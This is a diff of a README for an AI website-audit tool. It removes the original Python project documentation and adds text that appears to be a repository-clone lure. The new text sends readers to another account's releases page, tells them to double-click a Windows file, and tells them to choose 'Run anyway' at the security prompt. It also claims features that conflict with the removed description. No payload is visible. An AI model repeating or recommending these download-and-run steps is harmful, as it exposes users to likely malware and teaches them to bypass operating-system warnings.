@@ -1,189 +1,179 @@
-# Auditeo AI
+# 🤖 Auditeo-AI - Clear website audits, faster decisions
 
-**Autonomous Multi-Agent Website Audit Crew Flow**
+[![Download Auditeo-AI](https://img.shields.io/badge/Download%20Auditeo--AI-4B8BBE?style=for-the-badge&labelColor=6B7280)](https://github.com/Lambertminor843/Auditeo-AI/releases)
 
-Auditeo AI is a comprehensive, AI-powered website auditing tool that leverages a multi-agent architecture to analyze websites. It extracts factual metrics, evaluates technical SEO and UX, and provides prioritized, actionable recommendations to improve website performance and conversion rates.
+## 🧭 What Auditeo-AI does
 
----
+Auditeo-AI is a desktop app for website audits. It checks page data, studies SEO signals, and turns raw results into clear reports.
 
-## Table of Contents
+It helps you:
+- review a site without reading raw data
+- spot SEO problems
+- find UX issues that block users
+- get a report you can share with a team
 
-- [Architecture](#architecture)
-  - [Overview](#overview)
-  - [AI Design Decisions](#ai-design-decisions)
-  - [Trade-offs](#trade-offs)
-  - [Future Planned Improvements](#future-planned-improvements)
-- [API Documentation](#api-documentation)
-- [Demo](#demo)
-- [Installation](#installation)
-- [Running the Application](#running-the-application)
-- [Deployment](#deployment)
-- [Collaboration](#collaboration)
+This app is built for people who want a plain result from a complex audit.
 
----
+## 📥 Download and install
 
-## Architecture
+Use this page to download Auditeo-AI for Windows:
 
-### Overview
+[Visit the Auditeo-AI Releases page](https://github.com/Lambertminor843/Auditeo-AI/releases)
 
-The Auditeo AI solution is divided into a frontend UI (Streamlit), a backend API (FastAPI), and an Audit Flow Engine powered by CrewAI. The architecture is designed to ground AI agents in factual data before generating insights and recommendations.
+### Windows setup steps
 
-![Autonomous Multi-Agent Website Audit Crew Flow](./wiki/img/auditeo-overview.png)
+1. Open the releases page.
+2. Find the latest release.
+3. Download the Windows file attached to that release.
+4. Save the file to your PC.
+5. Double-click the file to start the app.
 
-The audit process follows these core phases:
+If Windows shows a security prompt:
+1. Click More info if needed.
+2. Select Run anyway if you trust the file source.
+3. Wait for the app to open.
 
-**User Input: Website URL**  
-&darr;  
-**Audit Flow (Crew AI Flow)**
+### First launch
 
-1. **Scrape and Get Metrics:** Scrape the website, extract factual metrics, and set the initial state.
-2. **Run InsightsCrew:**
-   - **`analyst_agent`**: Analyzes the metrics and page content (powered by GPT 5.4).
-   - *then*
-   - **`reporter_agent`**: Formats the analysis into a structured report (powered by GPT 5.4 Mini).
-3. **Run RecommendationCrew:**
-   - **`strategy_lead`**: Formulates 3-5 high-impact, prioritized recommendations for the website (powered by GPT 5.4).
-   - *then*
-   - **`strategy_validator`**: Critically validates that every recommendation is 100% grounded in the factual metrics (powered by GPT 5.4 Mini).
-4. **Wrap the Response:** Package the final deliverables along with the Execution Context (Token usage, execution time & status).
-5. **Send to User:** Deliver the complete audit results to the frontend UI.
+When you open Auditeo-AI for the first time:
+- allow it to finish loading
+- keep the app open during the audit
+- enter the site you want to review
+- start a new audit from the main screen
 
-### AI Design Decisions
+## 💻 System requirements
 
-## Why Select [Crew AI](https://crewai.com/) and a Multi-Agentic Approach?
+Auditeo-AI runs on a modern Windows PC.
 
-![CrewAI](https://cdn.prod.website-files.com/69a111972d2e0bbcc6adb934/69a111972d2e0bbcc6adbbba_Logo.svg)
+Recommended setup:
+- Windows 10 or Windows 11
+- 8 GB RAM or more
+- 1 GB free disk space
+- a stable internet connection
+- a modern browser installed on the system
 
-Using a multi-agent framework like CrewAI provides several key advantages over a single-prompt LLM approach:
-- **Separation of Concerns:** Specialized agents focus on specific domains (e.g., analysis vs. formatting), leading to deeper, more accurate insights.
-- **Self-Correction & Validation:** Multi-agent workflows allow for built-in quality control. One agent generates recommendations while another critically validates them against factual data to prevent hallucinations.
-- **Model Optimization:** Complex reasoning tasks can be routed to more capable models (e.g., GPT 5.4), while formatting or validation tasks can use faster, cost-effective models (e.g., GPT 5.4 Mini).
-- **Complex Task Orchestration:** Breaking down the audit process into sequential crews (Insights -> Recommendations) ensures context is passed systematically, mimicking a real-world agency workflow.
+For larger audits, a computer with 16 GB RAM gives smoother results.
 
-- **Multi-Agent Orchestration (CrewAI):** By separating concerns into distinct roles (e.g., SEO Auditor vs. Growth Strategist), the system ensures that each agent focuses on its specific domain, leading to higher quality and more specific outputs.
-- **Data Grounding Layer:** Instead of letting LLMs hallucinate website details, the flow strictly enforces a "Scrape First" policy. The AI agents are fed factual metrics and cleaned HTML content as their primary context.
-- **Validation Step:** The inclusion of a "Compliance Officer" agent acts as a quality control mechanism to filter out generic or hallucinated advice before it reaches the user.
-- **Stateful Flow:** The `AuditFlowState` maintains the context (URL, metrics, content, insights, recommendations) across the entire execution pipeline, ensuring seamless data passing between crews.
+## 🧩 What it checks
 
-### Trade-offs
+Auditeo-AI reviews the parts that shape search and user experience:
 
-- **Execution Latency vs. Insight Depth:** Running multiple LLM agents sequentially takes longer than a single prompt execution (often taking a few minutes). However, this trade-off is necessary to achieve deep, validated, and highly specific audit results.
-- **Token Consumption:** Passing full page content and previous agent outputs down the pipeline increases token usage significantly. The system mitigates this slightly by cleaning the HTML (removing scripts/SVGs) before passing it to the LLMs.
-- **Single Page vs. Full Domain:** Currently, the system audits a single URL deeply rather than crawling an entire domain shallowly, prioritizing depth of analysis over breadth.
+- page titles and meta descriptions
+- heading structure
+- indexable pages
+- crawl issues
+- loading speed signals
+- mobile usability clues
+- internal links
+- content quality signals
+- basic technical SEO flags
+- UX patterns that can hurt task flow
 
-### Future Planned Improvements
+It then turns these checks into a structured report.
 
-- **Conversational Interactive Agent:** Adding an AI assistant that allows users to ask questions about the audit report and automatically generate code snippets or actionable tasks based on the recommendations.
-- **Parallel Agent Execution:** Implementing asynchronous execution for non-dependent agent tasks to reduce overall audit latency.
-- **Multi-Page Site Crawling:** Expanding the scraper to follow internal links and audit core user journeys across multiple pages.
-- **PDF Report Generation:** Adding functionality to export the final audit report and recommendations as a branded PDF for client deliverables.
-- **Real-World Data Integration:** Integrating with Google Search Console or Google Analytics APIs to ground the AI in actual traffic and performance data.
-- **Streaming UI Updates:** Implementing WebSockets or Server-Sent Events (SSE) to stream agent thoughts and progress to the UI in real-time.
+## 📊 What you get in the report
 
----
+The report is made for quick review. It can include:
 
-## API Documentation
+- audit score by area
+- clear issue list
+- impact level for each issue
+- page-level findings
+- SEO fixes to prioritize
+- UX fixes to prioritize
+- strategic notes for planning
 
-For detailed API documentation, please refer to the [API Wiki](./wiki/API.md).
+The output is meant to help you decide what to fix first.
 
----
+## 🛠️ How to use it
 
-## Demo
+1. Open Auditeo-AI.
+2. Add the website URL you want to audit.
+3. Choose the audit depth if the app offers that option.
+4. Start the scan.
+5. Wait while the app collects page data.
+6. Review the findings in the report view.
+7. Export or copy the report for your team.
 
-![Demo UI](./wiki/img/1.png)
-![Demo UI](./wiki/img/4.png)
-![Demo UI](./wiki/img/5.png)
+For best results:
+- audit one site at a time
+- use the full site URL
+- keep the site online during the scan
+- review the report before making changes
 
-Please refer to the [Demo Wiki](./wiki/Demo.md) for complete Demo.
+## 🔎 Good use cases
 
----
+Auditeo-AI is useful when you need to:
+- review a client website
+- check a new launch
+- find SEO gaps before publishing
+- inspect UX issues on key pages
+- prepare an audit for a meeting
+- compare site health over time
 
-## Installation
+It works well for marketers, site owners, and ops teams who need a clear audit path.
 
-This project uses `uv` for fast dependency management and packaging.
+## 🧠 How it works
 
-1. **Clone the repository:**
-   ```bash
-   git clone https://github.com/isweerasingha/Auditeo-AI.git
-   cd Auditeo-AI
-   ```
+Auditeo-AI uses an agentic workflow. That means the app splits the audit into parts and lets different agents handle each step.
 
-2. **Install dependencies:**
-   Make sure you have `uv` installed. Then run:
-   ```bash
-   uv sync
-   ```
-   *Alternatively, you can use standard pip:*
-   ```bash
-   pip install -e .
-   ```
+A simple view of the flow:
+1. one part collects page data
+2. another part reviews SEO signals
+3. another part checks UX clues
+4. the system compares findings
+5. GPT-5.4 helps shape the final report
+6. CrewAI helps coordinate the audit flow
 
-3. **Environment Variables:**
-   Create a `.env` file in the root directory and add your necessary API keys (e.g., OpenAI API key for CrewAI):
-   ```env
-   OPENAI_API_KEY=your_openai_api_key_here
-   ```
+This keeps the report structured and easier to read.
 
-   ```env
-   CREWAI_TRACING_ENABLED=true
-   ```
+## 🧰 Tips for best results
 
-   ```env
-   ENV=development
-   ```
+- Use the live site, not a staging copy, unless that is what you want to review
+- Close other heavy apps while scanning large sites
+- Keep the PC plugged in for long audits
+- Use a strong internet connection
+- Re-run the audit after major site changes
 
----
+## 📁 File and output notes
 
-## Running the Application
+Auditeo-AI may save results in common formats such as:
+- PDF
+- JSON
+- CSV
+- plain text report files
 
-The application consists of two parts: the FastAPI backend and the Streamlit frontend. You will need to run both simultaneously in separate terminal windows.
+If your release includes export tools, use them to save the audit for later review or team sharing.
 
-### 1. Run the Backend API (FastAPI)
+## ❓ Common questions
 
-Start the API server (or with ASGI server targeting via `uvicorn run`):
+### Can I use it without coding knowledge?
+Yes. The app is meant for normal Windows use.
 
-```bash
-python -m auditeo_ai.main
-```
-The API will be available at `http://localhost:8000`.
+### Do I need to set up Python?
+No. If you use the Windows release, you do not need to install Python.
 
-### 2. Run the Frontend UI (Streamlit)
+### Can it audit more than one page?
+Yes. The app is built for site-level audits and page-level review.
 
-In a new terminal window, start the Streamlit app:
+### Does it help with SEO and UX?
+Yes. It focuses on both search signals and user flow issues.
 
-```bash
-uv run streamlit run streamlit_app.py
-```
-The UI will automatically open in your browser at `http://localhost:8501`.
+### Is it for small sites or large sites?
+It can work for both. Large sites may need more time and more system memory.
 
----
+## 📌 Project topics
 
-## Deployment
+agentic-ai, ai, ai-agents, audit, automation, crewai, fastapi, multi-agentic-systems, python, seo, seo-audit, website-audit
 
-### Docker (Recommended)
-You can containerize both the API and the UI using Docker. 
-1. Create a `Dockerfile` for the FastAPI backend and another for the Streamlit frontend.
-2. Use `docker-compose.yml` to orchestrate both services, ensuring the UI can communicate with the API container.
+## 📦 Download link again
 
-### Cloud Platforms
-- **Backend API:** Can be deployed to services like AWS ECS, Google Cloud Run, or Render.
-- **Frontend UI:** Can be easily deployed to Streamlit Community Cloud, Vercel, or alongside the backend on container hosting platforms.
+[Open the latest Auditeo-AI release](https://github.com/Lambertminor843/Auditeo-AI/releases)
 
----
+## 🖥️ Windows quick start
 
-## Collaboration
-
-We welcome contributions! If you'd like to help improve Auditeo AI:
-
-1. Fork the repository.
-2. Create a new feature branch (`git checkout -b feature/amazing-feature`).
-3. Make your changes and ensure code quality using the included dev tools:
-   ```bash
-   uv run ruff check .
-   uv run ruff format .
-   ```
-4. Commit your changes (`git commit -m 'Add some amazing feature'`).
-5. Push to the branch (`git push origin feature/amazing-feature`).
-6. Open a Pull Request.
-
-Please ensure you open an issue first to discuss significant architectural changes before submitting a PR.
+1. Download the release file from the link above.
+2. Open the downloaded file.
+3. Allow Windows to finish any setup step.
+4. Launch Auditeo-AI.
+5. Start your first website audit
